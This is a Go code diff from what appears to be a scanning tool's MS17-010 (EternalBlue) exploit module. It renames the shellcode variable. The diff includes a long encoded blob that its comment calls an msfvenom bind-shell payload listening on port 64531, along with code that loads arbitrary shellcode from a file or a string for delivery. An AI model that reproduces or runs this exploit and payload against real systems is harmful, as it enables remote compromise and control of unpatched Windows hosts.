@@ -19,7 +19,7 @@ func MS17010EXP(info *Common.HostInfo) {
 	var sc string
 
 	// 根据不同类型选择shellcode
-	switch Common.SC {
+	switch Common.Shellcode {
 	case "bind":
 		// msfvenom生成的Bind Shell, 监听64531端口
 		sc_enc := "gUYe7vm5/MQzTkSyKvpMFImS/YtwI+HxNUDd7MeUKDIxBZ8nsaUtdMEXIZmlZUfoQacylFEZpu7iWBRpQZw0KElIFkZR9rl4fpjyYNhEbf9JdquRrvw4hYMypBbfDQ6MN8csp1QF5rkMEs6HvtlKlGSaff34Msw6RlvEodROjGYA+mHUYvUTtfccymIqiU7hCFn+oaIk4ZtCS0Mzb1S5K5+U6vy3e5BEejJVA6u6I+EUb4AOSVVF8GpCNA91jWD1AuKcxg0qsMa+ohCWkWsOxh1zH0kwBPcWHAdHIs31g26NkF14Wl+DHStsW4DuNaxRbvP6awn+wD5aY/1QWlfwUeH/I+rkEPF18sTZa6Hr4mrDPT7eqh4UrcTicL/x4EgovNXA9X+mV6u1/4Zb5wy9rOVwJ+agXxfIqwL5r7R68BEPA/fLpx4LgvTwhvytO3w6I+7sZS7HekuKayBLNZ0T4XXeM8GpWA3h7zkHWjTm41/5JqWblQ45Msrg+XqD6WGvGDMnVZ7jE3xWIRBR7MrPAQ0Kl+Nd93/b+BEMwvuinXp1viSxEoZHIgJZDYR5DykQLpexasSpd8/WcuoQQtuTTYsJpHFfvqiwn0djgvQf3yk3Ro1EzjbR7a8UzwyaCqtKkCu9qGb+0m8JSpYS8DsjbkVST5Y7ZHtegXlX1d/FxgweavKGz3UiHjmbQ+FKkFF82Lkkg+9sO3LMxp2APvYz2rv8RM0ujcPmkN2wXE03sqcTfDdjCWjJ/evdrKBRzwPFhjOjUX1SBVsAcXzcvpJbAf3lcPPxOXM060OYdemu4Hou3oECjKP2h6W9GyPojMuykTkcoIqgN5Ldx6WpGhhE9wrfijOrrm7of9HmO568AsKRKBPfy/QpCfxTrY+rEwyzFmU1xZ2lkjt+FTnsMJY8YM7sIbWZauZ2S+Ux33RWDf7YUmSGlWC8djqDKammk3GgkSPHjf0Qgknukptxl977s2zw4jdh8bUuW5ap7T+Wd/S0ka90CVF4AyhonvAQoi0G1qj5gTih1FPTjBpf+FrmNJvNIAcx2oBoU4y48c8Sf4ABtpdyYewUh4NdxUoL7RSVouU1MZTnYS9BqOJWLMnvV7pwRmHgUz3fe7Kx5PGnP/0zQjW/P/vgmLMh/iBisJIGF3JDGoULsC3dabGE5L7sXuCNePiOEJmgwOHlFBlwqddNaE+ufor0q4AkQBI9XeqznUfdJg2M2LkUZOYrbCjQaE7Ytsr3WJSXkNbOORzqKo5wIf81z1TCow8QuwlfwIanWs+e8oTavmObV3gLPoaWqAIUzJqwD9O4P6x1176D0Xj83n6G4GrJgHpgMuB0qdlK"
@@ -56,15 +56,15 @@ func MS17010EXP(info *Common.HostInfo) {
 
 	default:
 		// 从文件读取或直接使用提供的shellcode
-		if strings.Contains(Common.SC, "file:") {
-			read, err := ioutil.ReadFile(Common.SC[5:])
+		if strings.Contains(Common.Shellcode, "file:") {
+			read, err := ioutil.ReadFile(Common.Shellcode[5:])
 			if err != nil {
-				Common.LogError(fmt.Sprintf("[-] MS17010读取Shellcode文件 %v 失败: %v", Common.SC, err))
+				Common.LogError(fmt.Sprintf("[-] MS17010读取Shellcode文件 %v 失败: %v", Common.Shellcode, err))
 				return
 			}
 			sc = fmt.Sprintf("%x", read)
 		} else {
-			sc = Common.SC
+			sc = Common.Shellcode
 		}
 	}
 
